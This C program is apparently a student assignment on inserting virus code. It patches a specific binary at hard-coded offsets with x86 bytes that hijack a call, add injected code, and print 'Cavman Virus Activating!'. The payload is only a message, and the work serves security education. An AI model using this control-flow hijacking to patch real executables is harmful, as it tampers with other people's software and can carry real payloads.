#include <stdio.h>
#define BUFSIZE 5660
/*
 * Rock Beom Kim rk5dy
 * Assignment 7: Inserting Virus Code
 * 
 * */
int main(int argc, char **argv) {
	if (argc != 3) {
		printf("Please use the right no. of inputs\n");
		return 0;
	}
	FILE *fp, *wfp;
	char buff[BUFSIZE];
	int i;
	
	fp = fopen(argv[1], "r");
	wfp = fopen(argv[2], "w");
	for (i = 0; i < BUFSIZE; i++) {
		buff[i] = fgetc(fp);
	}
	
	//overwrite starting with c3 address	
	//actual tricky jump here
	buff[1109] = '\xe8';
	buff[1110] = '\x17';
	buff[1111] = '\x00';
	buff[1112] = '\x00';
	buff[1113] = '\x00';
	buff[1114] = '\xc3';
	
	//"Cavman Virus Activating!" string
	buff[1579] = '\x43';
	buff[1580] = '\x61';
	buff[1581] = '\x76';
	buff[1582] = '\x6d';
	buff[1583] = '\x61';
	buff[1584] = '\x6e';	
	buff[1585] = '\x20';

	buff[1586] = '\x76';
	buff[1587] = '\x69';
	buff[1588] = '\x72';
	buff[1589] = '\x75';
	buff[1590] = '\x73';
	buff[1591] = '\x20';

	buff[1592] = '\x61';
	buff[1593] = '\x63';
	buff[1594] = '\x74';
	buff[1595] = '\x69';
	buff[1596] = '\x76';
	buff[1597] = '\x61';
	buff[1598] = '\x74';
	buff[1599] = '\x69';
	buff[1600] = '\x6e';
	buff[1601] = '\x67';
	buff[1602] = '\x21';
	buff[1603] = '\x00';

	//the code to jump to
	//prologue
	buff[1137] = '\x55';
	buff[1138] = '\x89';
	buff[1139] = '\xe5';
	
	//space allocation
	buff[1140] = '\x83';
	buff[1141] = '\xec';
	buff[1142] = '\x08';
	
	buff[1143] = '\x83';
	buff[1144] = '\xec';
	buff[1145] = '\x0c';
	
	//push 0x804862b
	buff[1146] = '\x68';
	buff[1147] = '\x2b';
	buff[1148] = '\x86';
	buff[1149] = '\x04';
	buff[1150] = '\x08';
	
	//call 80482d0
	//so far 14 calls added and 5 calls from the 61
	buff[1151] = '\xe8';
	buff[1152] = '\x4c';
	buff[1153] = '\xfe';
	buff[1154] = '\xff';
	buff[1155] = '\xff';
	buff[1156] = '\xc9';
	
	//call to virus code
	//buff[1157] = '\xc3';
	buff[1157] = '\xe8';
	buff[1158] = '\x77';
	buff[1159] = '\x00';
	buff[1160] = '\x00';
	buff[1161] = '\x00';
	buff[1162] = '\xc3';
	for (i = 0; i < BUFSIZE; i++) {
		fputc(buff[i], wfp);
	}
	fclose(fp);
	fclose(wfp);
	return 0;
}
